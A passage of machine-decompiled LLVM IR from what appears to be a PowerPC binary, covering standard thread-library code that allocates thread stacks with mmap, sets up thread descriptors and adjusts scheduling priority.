  store i32 0, i32* @global_var_1002c34c.201, align 4
  store i32 268459856, i32* @lr, align 4
  %v2_10005f4c = call i32 @pthread_reap_children(i32 %v0_10005f18, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v2_10005f4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005f50

dec_label_pc_10005f50:                            ; preds = %dec_label_pc_10005f34, %dec_label_pc_10005f44
  %v0_10005f50 = load i32, i32* @r31, align 4
  %v3_10005f50 = icmp eq i32 %v0_10005f50, 1
  store i1 %v3_10005f50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005f50, label %dec_label_pc_10005f58, label %dec_label_pc_10005f04

dec_label_pc_10005f58:                            ; preds = %dec_label_pc_10005f50
  store i32 %v4_10005f58, i32* %r0.global-to-local, align 4
  store i32 %v1_10005f5c, i32* %r9.global-to-local, align 4
  br i1 %v3_10005f5c, label %dec_label_pc_10005f04, label %dec_label_pc_10005f64

dec_label_pc_10005f64:                            ; preds = %dec_label_pc_10005f58
  %v0_10005f64 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10005f64, i32* %r3.global-to-local, align 4
  store i32 %v2_10005ecc, i32* %r4.global-to-local, align 4
  store i32 268459892, i32* @lr, align 4
  %v1_10005f70 = call i32 @__libc_read(i32 %v0_10005f64)
  store i32 %v1_10005f70, i32* %r3.global-to-local, align 4
  store i32 %tmp16, i32* %r0.global-to-local, align 4
  store i1 %v3_10005f78, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10005f78, label %dec_label_pc_10005f04, label %dec_label_pc_10005f80

dec_label_pc_10005f80:                            ; preds = %dec_label_pc_10005f64
  store i32 %v1_10005f84, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10015cd0.214 to i32), i32* %r9.global-to-local, align 4
  %v4_10005f8c = load i32, i32* %v3_10005f8c, align 4
  %v2_10005f90 = add i32 %v4_10005f8c, ptrtoint (i32* @global_var_10015cd0.214 to i32)
  store i32 %v2_10005f90, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_10005f90)
  store i32 268459940, i32* @lr, align 4
  %v0_10005fa0 = call i32 @__GI_getpagesize()
  store i32 %v0_10005fa0, i32* %r3.global-to-local, align 4
  %v3_10005fa4 = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_10005fa4, i32* %r23.global-to-local, align 4
  store i32 %v0_10005fa0, i32* %r27.global-to-local, align 4
  %v0_10005fac = load i32, i32* @r30, align 4
  %v3_10005fac = icmp eq i32 %v0_10005fac, 0
  store i1 %v3_10005fac, i1* %cr7_eq.global-to-local, align 1
  %v1_10005fb8 = add i32 %v3_10005fa4, 20
  %v2_10005fb8 = inttoptr i32 %v1_10005fb8 to i32*
  %v3_10005fb8 = load i32, i32* %v2_10005fb8, align 4
  store i32 %v3_10005fb8, i32* %r22.global-to-local, align 4
  %v1_10005fbc = add i32 %v3_10005fa4, 412
  %v2_10005fbc = inttoptr i32 %v1_10005fbc to i32*
  %v3_10005fbc = load i32, i32* %v2_10005fbc, align 4
  store i32 %v3_10005fbc, i32* %r18.global-to-local, align 4
  br i1 %v3_10005fac, label %dec_label_pc_10005fe4.preheader, label %dec_label_pc_10005fc4

dec_label_pc_10005fc4:                            ; preds = %dec_label_pc_10005f80
  %v1_10005fc4 = add i32 %v0_10005fac, 4
  %v2_10005fc4 = inttoptr i32 %v1_10005fc4 to i32*
  %v3_10005fc4 = load i32, i32* %v2_10005fc4, align 4
  store i32 %v3_10005fc4, i32* %r0.global-to-local, align 4
  %v3_10005fc8 = icmp eq i32 %v3_10005fc4, 0
  store i1 %v3_10005fc8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005fc8, label %dec_label_pc_10005fe4.preheader, label %dec_label_pc_10005fd0

dec_label_pc_10005fd0:                            ; preds = %dec_label_pc_10005fc4
  store i32 268459988, i32* @lr, align 4
  %v0_10005fd0 = call i32 @geteuid()
  %v3_10005fd4 = icmp eq i32 %v0_10005fd0, 0
  store i1 %v3_10005fd4, i1* %cr7_eq.global-to-local, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10005fd4, label %dec_label_pc_10005fe4.preheader, label %dec_label_pc_100063b4

dec_label_pc_10005fe4.preheader:                  ; preds = %dec_label_pc_10005fd0, %dec_label_pc_10005fc4, %dec_label_pc_10005f80
  store i32 2, i32* %r24.global-to-local, align 4
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10005fec

dec_label_pc_10005fec:                            ; preds = %dec_label_pc_10005fe4.preheader, %dec_label_pc_10006108
  %v0_10006090 = phi i32 [ 2, %dec_label_pc_10005fe4.preheader ], [ %v1_10006108, %dec_label_pc_10006108 ]
  %v1_10005ff0 = mul i32 %v0_10006090, 16
  store i32 ptrtoint (i32* @global_var_10027f00.170 to i32), i32* %r9.global-to-local, align 4
  %v2_10005ff8 = add i32 %v1_10005ff0, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %v2_10005ff8, i32* %r11.global-to-local, align 4
  %v1_10005ffc = add i32 %v1_10005ff0, add (i32 ptrtoint (i32* @global_var_10027f00.170 to i32), i32 8)
  %v2_10005ffc = inttoptr i32 %v1_10005ffc to i32*
  %v3_10005ffc = load i32, i32* %v2_10005ffc, align 4
  store i32 %v3_10005ffc, i32* %r0.global-to-local, align 4
  %v3_10006000 = icmp eq i32 %v3_10005ffc, 0
  store i1 %v3_10006000, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006000, label %dec_label_pc_10006008, label %dec_label_pc_10006108

dec_label_pc_10006008:                            ; preds = %dec_label_pc_10005fec
  %v0_10006008 = load i32, i32* @r30, align 4
  %v3_10006008 = icmp eq i32 %v0_10006008, 0
  store i1 %v3_10006008, i1* %cr7_eq.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10006010 = load i32, i32* @global_var_1002c328.139, align 4
  store i32 %v3_10006010, i32* %r11.global-to-local, align 4
  br i1 %v3_10006008, label %dec_label_pc_10006050, label %dec_label_pc_10006018

dec_label_pc_10006018:                            ; preds = %dec_label_pc_10006008
  %v1_10006018 = add i32 %v0_10006008, 24
  %v2_10006018 = inttoptr i32 %v1_10006018 to i32*
  %v3_10006018 = load i32, i32* %v2_10006018, align 4
  store i32 %v3_10006018, i32* %r0.global-to-local, align 4
  %v3_1000601c = icmp eq i32 %v3_10006018, 0
  store i1 %v3_1000601c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000601c, label %dec_label_pc_10006050, label %dec_label_pc_10006024

dec_label_pc_10006024:                            ; preds = %dec_label_pc_10006018
  %v1_10006024 = add i32 %v0_10006008, 28
  %v2_10006024 = inttoptr i32 %v1_10006024 to i32*
  %v3_10006024 = load i32, i32* %v2_10006024, align 4
  store i32 %v3_10006024, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  %v1_1000602c = add i32 %v0_10006008, 32
  %v2_1000602c = inttoptr i32 %v1_1000602c to i32*
  %v3_1000602c = load i32, i32* %v2_1000602c, align 4
  store i32 %v3_1000602c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v1_10006034 = call i32 @__asm_rlwinm(i32 %v3_10006024, i32 0, i32 0, i32 29)
  store i32 %v1_10006034, i32* %r11.global-to-local, align 4
  %v0_10006038 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006038 = sub i32 %v3_10006024, %v0_10006038
  store i32 %v2_10006038, i32* %r27.global-to-local, align 4
  %v1_1000603c = add i32 %v1_10006034, -480
  store i32 %v1_1000603c, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* @global_var_1002c358.215, align 4
  br label %dec_label_pc_10006110

dec_label_pc_10006050:                            ; preds = %dec_label_pc_10006018, %dec_label_pc_10006008
  store i1 %v3_10006008, i1* %cr7_eq.global-to-local, align 1
  store i32 2097152, i32* %r0.global-to-local, align 4
  %v0_10006058 = load i32, i32* %r27.global-to-local, align 4
  %v2_10006058 = sub i32 2097152, %v0_10006058
  store i32 %v2_10006058, i32* %r29.global-to-local, align 4
  br i1 %v3_10006008, label %dec_label_pc_10006080, label %dec_label_pc_10006060

dec_label_pc_10006060:                            ; preds = %dec_label_pc_10006050
  %v1_10006060 = add i32 %v0_10006008, 32
  %v2_10006060 = inttoptr i32 %v1_10006060 to i32*
  %v3_10006060 = load i32, i32* %v2_10006060, align 4
  %v2_10006064 = add i32 %v0_10006058, -1
  %v1_10006068 = add i32 %v2_10006064, %v3_10006060
  %v2_1000606c = urem i32 %v1_10006068, %v0_10006058
  %v2_10006070 = sub i32 %v1_10006068, %v2_1000606c
  store i32 %v2_10006070, i32* %r9.global-to-local, align 4
  %v2_10006074 = icmp ult i32 %v2_10006058, %v2_10006070
  %v4_10006074 = icmp eq i32 %v2_10006058, %v2_10006070
  store i1 %v4_10006074, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10006074, label %dec_label_pc_10006080, label %dec_label_pc_10006084

dec_label_pc_10006080:                            ; preds = %dec_label_pc_10006060, %dec_label_pc_10006050
  br label %dec_label_pc_10006084

dec_label_pc_10006084:                            ; preds = %dec_label_pc_10006060, %dec_label_pc_10006080
  %storemerge = phi i32 [ %v2_10006058, %dec_label_pc_10006080 ], [ %v2_10006070, %dec_label_pc_10006060 ]
  store i32 %storemerge, i32* @r31, align 4
  %v3_1000608c = load i32, i32* @global_var_1002c39c.149, align 4
  %tmp29 = mul i32 %v0_10006090, -2097152
  %v2_10006094 = add i32 %v3_10006010, %tmp29
  store i32 306, i32* %r6.global-to-local, align 4
  %v1_1000609c = add i32 %v2_10006094, 2097152
  store i32 %v1_1000609c, i32* %r9.global-to-local, align 4
  %v1_100060a0 = mul i32 %v3_1000608c, 4
  store i32 %v1_100060a0, i32* %r4.global-to-local, align 4
  %v2_100060a4 = sub i32 %v1_1000609c, %v1_100060a0
  store i32 %v2_100060a4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v1_100060b0 = add i32 %v2_10006094, 2096672
  store i32 %v1_100060b0, i32* %r28.global-to-local, align 4
  store i32 268460216, i32* @lr, align 4
  %v7_100060b4 = call i32 @mmap(i32 %v2_100060a4, i32 %v1_100060a0, i32 7, i32 306, i32 -1, i32 0, i32 %v1_1000609c)
  store i32 %v7_100060b4, i32* %r3.global-to-local, align 4
  %v3_100060b8 = icmp eq i32 %v7_100060b4, -1
  store i1 %v3_100060b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100060b8, label %dec_label_pc_10006084.dec_label_pc_10006108_crit_edge, label %dec_label_pc_100060c0

dec_label_pc_10006084.dec_label_pc_10006108_crit_edge: ; preds = %dec_label_pc_10006084
  %v0_10006108.pre = load i32, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_10006108

dec_label_pc_100060c0:                            ; preds = %dec_label_pc_10006084
  %v0_100060c0 = load i32, i32* @r31, align 4
  %v1_100060c0 = load i32, i32* %r29.global-to-local, align 4
  %v4_100060c0 = icmp eq i32 %v0_100060c0, %v1_100060c0
  store i1 %v4_100060c0, i1* %cr7_eq.global-to-local, align 1
  %v1_100060c4 = load i32, i32* %r28.global-to-local, align 4
  %v2_100060c4 = sub i32 %v1_100060c4, %v0_100060c0
  store i32 %v2_100060c4, i32* %r9.global-to-local, align 4
  %v1_100060c8 = add i32 %v2_100060c4, 480
  store i32 %v1_100060c8, i32* %r27.global-to-local, align 4
  br i1 %v4_100060c0, label %dec_label_pc_100060fc, label %dec_label_pc_100060d0

dec_label_pc_100060d0:                            ; preds = %dec_label_pc_100060c0
  %v0_100060d0 = load i32, i32* @r30, align 4
  %v1_100060d0 = add i32 %v0_100060d0, 20
  %v2_100060d0 = inttoptr i32 %v1_100060d0 to i32*
  %v3_100060d0 = load i32, i32* %v2_100060d0, align 4
  store i32 %v3_100060d0, i32* %r26.global-to-local, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_100060e0 = sub i32 %v1_100060c8, %v3_100060d0
  store i32 %v2_100060e0, i32* %r25.global-to-local, align 4
  store i32 %v3_100060d0, i32* %r4.global-to-local, align 4
  store i32 %v2_100060e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 268460276, i32* @lr, align 4
  %v7_100060f0 = call i32 @mmap(i32 %v2_100060e0, i32 %v3_100060d0, i32 0, i32 16, i32 -1, i32 0, i32 %v2_100060c4)
  store i32 %v7_100060f0, i32* %r3.global-to-local, align 4
  %v3_100060f4 = icmp eq i32 %v7_100060f0, -1
  store i1 %v3_100060f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100060f4, label %dec_label_pc_100060fc, label %dec_label_pc_10006110

dec_label_pc_100060fc:                            ; preds = %dec_label_pc_100060d0, %dec_label_pc_100060c0
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10006110

dec_label_pc_10006108:                            ; preds = %dec_label_pc_10006084.dec_label_pc_10006108_crit_edge, %dec_label_pc_10005fec
  %v0_10006108 = phi i32 [ %v0_10006108.pre, %dec_label_pc_10006084.dec_label_pc_10006108_crit_edge ], [ %v0_10006090, %dec_label_pc_10005fec ]
  %v1_10006108 = add i32 %v0_10006108, 1
  store i32 %v1_10006108, i32* %r24.global-to-local, align 4
  %v2_10005fe4 = icmp ugt i32 %v1_10006108, 1023
  %v3_10005fe4 = icmp eq i32 %v1_10006108, 1023
  store i1 %v3_10005fe4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10005fe4, label %dec_label_pc_100063a0, label %dec_label_pc_10005fec

dec_label_pc_10006110:                            ; preds = %dec_label_pc_100060d0, %dec_label_pc_100060fc, %dec_label_pc_10006024
  %v0_10006110 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006110, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v0_10006110, i32* @r31, align 4
  store i32 268460324, i32* @lr, align 4
  %v3_10006120 = call i32 @__GI_memset(i32 %v0_10006110, i32 0, i32 480)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r3.global-to-local, align 4
  %v3_1000612c = load i32, i32* @global_var_1002c354.216, align 4
  %v3_10006130 = load i32, i32* @global_var_1002c294.204, align 4
  %v0_10006134 = load i32, i32* @r30, align 4
  %v3_10006134 = icmp eq i32 %v0_10006134, 0
  store i1 %v3_10006134, i1* %cr7_eq.global-to-local, align 1
  %v1_1000613c = add i32 %v3_1000612c, 1024
  store i32 %v1_1000613c, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10027f00.170 to i32), i32* %r8.global-to-local, align 4
  %v0_10006144 = load i32, i32* %r24.global-to-local, align 4
  %v1_10006144 = mul i32 %v0_10006144, 16
  store i32 %v1_10006144, i32* %r29.global-to-local, align 4
  %v0_10006148 = load i32, i32* @r31, align 4
  %v1_10006148 = add i32 %v0_10006148, 72
  %v1_1000614c = add i32 %v3_10006130, 1
  store i32 %v1_1000614c, i32* %r9.global-to-local, align 4
  store i32 %v1_1000614c, i32* @global_var_1002c294.204, align 4
  %v2_10006154 = add i32 %v1_10006144, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %v2_10006154, i32* @r10, align 4
  store i32 %v1_1000613c, i32* @global_var_1002c354.216, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_10006160 = add i32 %v0_10006148, 68
  %v3_10006160 = inttoptr i32 %v2_10006160 to i32*
  store i32 %v1_10006148, i32* %v3_10006160, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_10006168 = load i32, i32* %r24.global-to-local, align 4
  %v1_10006168 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006168 = add i32 %v1_10006168, %v0_10006168
  store i32 %v2_10006168, i32* %r28.global-to-local, align 4
  %v0_1000616c = load i32, i32* @r31, align 4
  %v1_1000616c = add i32 %v0_1000616c, 80
  store i32 %v1_1000616c, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10006174 = load i32, i32* %r6.global-to-local, align 4
  %v1_10006174 = trunc i32 %v0_10006174 to i8
  %v3_10006174 = add i32 %v0_1000616c, 65
  %v4_10006174 = inttoptr i32 %v3_10006174 to i8*
  store i8 %v1_10006174, i8* %v4_10006174, align 1
  %v0_10006178 = load i32, i32* %r7.global-to-local, align 4
  %v1_10006178 = load i32, i32* @r31, align 4
  %v2_10006178 = add i32 %v1_10006178, 76
  %v3_10006178 = inttoptr i32 %v2_10006178 to i32*
  store i32 %v0_10006178, i32* %v3_10006178, align 4
  %v0_1000617c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000617c = load i32, i32* @r31, align 4
  %v2_1000617c = add i32 %v1_1000617c, 396
  %v3_1000617c = inttoptr i32 %v2_1000617c to i32*
  store i32 %v0_1000617c, i32* %v3_1000617c, align 4
  %v0_10006180 = load i32, i32* %r26.global-to-local, align 4
  %v1_10006180 = load i32, i32* @r31, align 4
  %v2_10006180 = add i32 %v1_10006180, 400
  %v3_10006180 = inttoptr i32 %v2_10006180 to i32*
  store i32 %v0_10006180, i32* %v3_10006180, align 4
  %v0_10006184 = load i32, i32* %r28.global-to-local, align 4
  %v1_10006184 = load i32, i32* @r31, align 4
  %v2_10006184 = add i32 %v1_10006184, 16
  %v3_10006184 = inttoptr i32 %v2_10006184 to i32*
  store i32 %v0_10006184, i32* %v3_10006184, align 4
  %v0_10006188 = load i32, i32* @r10, align 4
  %v1_10006188 = load i32, i32* @r31, align 4
  %v2_10006188 = add i32 %v1_10006188, 28
  %v3_10006188 = inttoptr i32 %v2_10006188 to i32*
  store i32 %v0_10006188, i32* %v3_10006188, align 4
  %v0_1000618c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000618c = trunc i32 %v0_1000618c to i8
  %v2_1000618c = load i32, i32* @r31, align 4
  %v3_1000618c = add i32 %v2_1000618c, 64
  %v4_1000618c = inttoptr i32 %v3_1000618c to i8*
  store i8 %v1_1000618c, i8* %v4_1000618c, align 1
  %v0_10006190 = load i32, i32* @r31, align 4
  %v2_10006190 = add i32 %v0_10006190, 404
  %v3_10006190 = inttoptr i32 %v2_10006190 to i32*
  store i32 %v0_10006190, i32* %v3_10006190, align 4
  %v0_10006194 = load i32, i32* %r24.global-to-local, align 4
  %v1_10006194 = load i32, i32* @r31, align 4
  %v2_10006194 = add i32 %v1_10006194, 408
  %v3_10006194 = inttoptr i32 %v2_10006194 to i32*
  store i32 %v0_10006194, i32* %v3_10006194, align 4
  %v0_10006198 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006198 = load i32, i32* %r29.global-to-local, align 4
  %v2_10006198 = load i32, i32* %r8.global-to-local, align 4
  %v3_10006198 = add i32 %v2_10006198, %v1_10006198
  %v4_10006198 = inttoptr i32 %v3_10006198 to i32*
  store i32 %v0_10006198, i32* %v4_10006198, align 4
  %v0_1000619c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000619c = load i32, i32* @r10, align 4
  %v2_1000619c = add i32 %v1_1000619c, 4
  %v3_1000619c = inttoptr i32 %v2_1000619c to i32*
  store i32 %v0_1000619c, i32* %v3_1000619c, align 4
  %v0_100061a0 = load i32, i32* %r27.global-to-local, align 4
  %v1_100061a0 = load i32, i32* @r10, align 4
  %v2_100061a0 = add i32 %v1_100061a0, 12
  %v3_100061a0 = inttoptr i32 %v2_100061a0 to i32*
  store i32 %v0_100061a0, i32* %v3_100061a0, align 4
  %v0_100061a4 = load i32, i32* @r31, align 4
  %v1_100061a4 = load i32, i32* @r10, align 4
  %v2_100061a4 = add i32 %v1_100061a4, 8
  %v3_100061a4 = inttoptr i32 %v2_100061a4 to i32*
  store i32 %v0_100061a4, i32* %v3_100061a4, align 4
  %v0_100061a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100061a8 = load i32, i32* @r31, align 4
  %v2_100061a8 = add i32 %v1_100061a8, 228
  %v3_100061a8 = inttoptr i32 %v2_100061a8 to i32*
  store i32 %v0_100061a8, i32* %v3_100061a8, align 4
  %v0_100061ac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100061ac, label %dec_label_pc_10006210, label %dec_label_pc_100061b0

dec_label_pc_100061b0:                            ; preds = %dec_label_pc_10006110
  %v0_100061b0 = load i32, i32* @r30, align 4
  %v1_100061b0 = inttoptr i32 %v0_100061b0 to i32*
  %v2_100061b0 = load i32, i32* %v1_100061b0, align 4
  store i32 %v2_100061b0, i32* %r0.global-to-local, align 4
  %v1_100061b4 = trunc i32 %v2_100061b0 to i8
  %v2_100061b4 = load i32, i32* @r31, align 4
  %v3_100061b4 = add i32 %v2_100061b4, 45
  %v4_100061b4 = inttoptr i32 %v3_100061b4 to i8*
  store i8 %v1_100061b4, i8* %v4_100061b4, align 1
  %v0_100061b8 = load i32, i32* @r30, align 4
  %v1_100061b8 = add i32 %v0_100061b8, 24
  %v2_100061b8 = inttoptr i32 %v1_100061b8 to i32*
  %v3_100061b8 = load i32, i32* %v2_100061b8, align 4
  store i32 %v3_100061b8, i32* %r0.global-to-local, align 4
  %v1_100061bc = load i32, i32* @r31, align 4
  %v2_100061bc = add i32 %v1_100061bc, 392
  %v3_100061bc = inttoptr i32 %v2_100061bc to i32*
  store i32 %v3_100061b8, i32* %v3_100061bc, align 4
  %v0_100061c0 = load i32, i32* @r30, align 4
  %v1_100061c0 = add i32 %v0_100061c0, 12
  %v2_100061c0 = inttoptr i32 %v1_100061c0 to i32*
  %v3_100061c0 = load i32, i32* %v2_100061c0, align 4
  store i32 %v3_100061c0, i32* %r0.global-to-local, align 4
  %v3_100061c4 = icmp eq i32 %v3_100061c0, 0
  store i1 %v3_100061c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100061c4, label %dec_label_pc_100061f0, label %dec_label_pc_100061cc

dec_label_pc_100061cc:                            ; preds = %dec_label_pc_100061b0
  %v3_100061cc = icmp eq i32 %v3_100061c0, 1
  store i1 %v3_100061cc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100061cc, label %dec_label_pc_100061d4, label %dec_label_pc_10006208

dec_label_pc_100061d4:                            ; preds = %dec_label_pc_100061cc
  %v1_100061d4 = add i32 %v0_100061c0, 4
  %v2_100061d4 = inttoptr i32 %v1_100061d4 to i32*
  %v3_100061d4 = load i32, i32* %v2_100061d4, align 4
  store i32 %v3_100061d4, i32* %r0.global-to-local, align 4
  %v0_100061d8 = load i32, i32* @r31, align 4
  %v1_100061d8 = add i32 %v0_100061d8, 232
  store i32 %v1_100061d8, i32* @r3, align 4
  %v1_100061dc = add i32 %v0_100061c0, 8
  store i32 %v1_100061dc, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v2_100061e4 = add i32 %v0_100061d8, 228
  %v3_100061e4 = inttoptr i32 %v2_100061e4 to i32*
  store i32 %v3_100061d4, i32* %v3_100061e4, align 4
  store i32 ptrtoint (i32* @global_var_100061ec.217 to i32), i32* @lr, align 4
  %v0_100061e8 = call i32 @memcpy()
  store i32 %v0_100061e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006208

dec_label_pc_100061f0:                            ; preds = %dec_label_pc_100061b0
  %v0_100061f0 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100061f0, i32* %r3.global-to-local, align 4
  store i32 268460536, i32* @lr, align 4
  %v1_100061f4 = call i32 @sched_getscheduler(i32 %v0_100061f0)
  %v0_100061f8 = load i32, i32* @r31, align 4
  %v1_100061f8 = add i32 %v0_100061f8, 232
  store i32 %v1_100061f8, i32* %r4.global-to-local, align 4
  %v2_100061fc = add i32 %v0_100061f8, 228
  %v3_100061fc = inttoptr i32 %v2_100061fc to i32*
  store i32 %v1_100061f4, i32* %v3_100061fc, align 4
  %v0_10006200 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10006200, i32* %r3.global-to-local, align 4
  store i32 268460552, i32* @lr, align 4
  %v2_10006204 = call i32 @sched_getparam(i32 %v0_10006200, i32 %v1_100061f8)
  store i32 %v2_10006204, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006208

dec_label_pc_10006208:                            ; preds = %dec_label_pc_100061cc, %dec_label_pc_100061d4, %dec_label_pc_100061f0
  %v0_10006208 = load i32, i32* @r31, align 4
  %v1_10006208 = add i32 %v0_10006208, 232
  %v2_10006208 = inttoptr i32 %v1_10006208 to i32*
  %v3_10006208 = load i32, i32* %v2_10006208, align 4
  store i32 %v3_10006208, i32* %r0.global-to-local, align 4
  %v2_1000620c = add i32 %v0_10006208, 24
  %v3_1000620c = inttoptr i32 %v2_1000620c to i32*
  store i32 %v3_10006208, i32* %v3_1000620c, align 4
  br label %dec_label_pc_10006210

dec_label_pc_10006210:                            ; preds = %dec_label_pc_10006110, %dec_label_pc_10006208
  %v0_10006210 = load i32, i32* %r20.global-to-local, align 4
  %v1_10006210 = load i32, i32* @r31, align 4
  %v2_10006210 = add i32 %v1_10006210, 92
  %v3_10006210 = inttoptr i32 %v2_10006210 to i32*
  store i32 %v0_10006210, i32* %v3_10006210, align 4
  store i32 %v2_10006214, i32* @r4, align 4
  %v0_10006218 = load i32, i32* %r19.global-to-local, align 4
  %v1_10006218 = load i32, i32* @r31, align 4
  %v2_10006218 = add i32 %v1_10006218, 96
  %v3_10006218 = inttoptr i32 %v2_10006218 to i32*
  store i32 %v0_10006218, i32* %v3_10006218, align 4
  store i32 128, i32* @r5, align 4
  %v0_10006220 = load i32, i32* @r31, align 4
  %v1_10006220 = add i32 %v0_10006220, 100
  store i32 %v1_10006220, i32* @r3, align 4
  store i32 268460584, i32* @lr, align 4
  %v0_10006224 = call i32 @memcpy()
  store i32 %v0_10006224, i32* %r3.global-to-local, align 4
  %v0_10006228 = load i32, i32* @r31, align 4
  %v1_10006228 = add i32 %v0_10006228, 24
  %v2_10006228 = inttoptr i32 %v1_10006228 to i32*
  %v3_10006228 = load i32, i32* %v2_10006228, align 4
  store i32 %v3_10006228, i32* %r3.global-to-local, align 4
  store i32 268460592, i32* @lr, align 4
  %v1_1000622c = call i32 @__pthread_manager_adjust_prio(i32 %v3_10006228)
  store i32 %v1_1000622c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r11.global-to-local, align 4
  %v3_10006234 = load i32, i32* @global_var_1002c254, align 4
  %v0_10006238 = load i32, i32* %r18.global-to-local, align 4
  %v3_10006238 = icmp eq i32 %v0_10006238, 0
  store i1 %v3_10006238, i1* %cr7_eq.global-to-local, align 1
  %v1_1000623c = load i32, i32* @r31, align 4
  %v2_1000623c = add i32 %v1_1000623c, 4
  %v3_1000623c = inttoptr i32 %v2_1000623c to i32*
  store i32 %v3_10006234, i32* %v3_1000623c, align 4
  %v3_10006240 = load i32, i32* @global_var_1002c254, align 4
  store i32 %v3_10006240, i32* %r0.global-to-local, align 4
  %v1_10006248 = load i32, i32* @r31, align 4
  %v2_10006248 = inttoptr i32 %v1_10006248 to i32*
  store i32 %v3_10006240, i32* %v2_10006248, align 4
  %v3_1000624c = load i32, i32* @global_var_1002c254, align 4
  %v0_10006254 = load i32, i32* @r31, align 4
  %v2_10006254 = add i32 %v3_1000624c, 4
  %v3_10006254 = inttoptr i32 %v2_10006254 to i32*
  store i32 %v0_10006254, i32* %v3_10006254, align 4
  %v3_10006258 = load i32, i32* @global_var_1002c254, align 4
  store i32 %v3_10006258, i32* %r9.global-to-local, align 4
  %v0_1000625c = load i32, i32* @r31, align 4
  %v2_1000625c = inttoptr i32 %v3_10006258 to i32*
  store i32 %v0_1000625c, i32* %v2_1000625c, align 4
  br i1 %v3_10006238, label %dec_label_pc_100062e4, label %dec_label_pc_10006264

dec_label_pc_10006264:                            ; preds = %dec_label_pc_10006210
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10006268 = load i32, i32* @global_var_1002c35c.154, align 4
  store i32 %v3_10006268, i32* %r0.global-to-local, align 4
  %v0_1000626c = load i32, i32* %r23.global-to-local, align 4
  %v1_1000626c = add i32 %v0_1000626c, 416
  %v2_1000626c = inttoptr i32 %v1_1000626c to i32*
  %v3_1000626c = load i32, i32* %v2_1000626c, align 4
  %v2_10006270 = or i32 %v3_1000626c, %v3_10006268
  store i32 %v2_10006270, i32* %r0.global-to-local, align 4
  %v1_10006274 = and i32 %v2_10006270, 128
  store i32 %v1_10006274, i32* %r9.global-to-local, align 4
  %v3_10006274 = icmp eq i32 %v1_10006274, 0
  br i1 %v3_10006274, label %dec_label_pc_100062e4, label %dec_label_pc_1000627c

dec_label_pc_1000627c:                            ; preds = %dec_label_pc_10006264
  %v0_1000627c = load i32, i32* @r31, align 4
  %v1_1000627c = add i32 %v0_1000627c, 28
  %v2_1000627c = inttoptr i32 %v1_1000627c to i32*
  %v3_1000627c = load i32, i32* %v2_1000627c, align 4
  store i32 %v3_1000627c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268460680, i32* @lr, align 4
  %v0_10006284 = call i32 @__pthread_lock()
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_1000628c = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 268458920, i32* %r3.global-to-local, align 4
  %v0_10006298 = load i32, i32* @r31, align 4
  store i32 %v0_10006298, i32* %r4.global-to-local, align 4
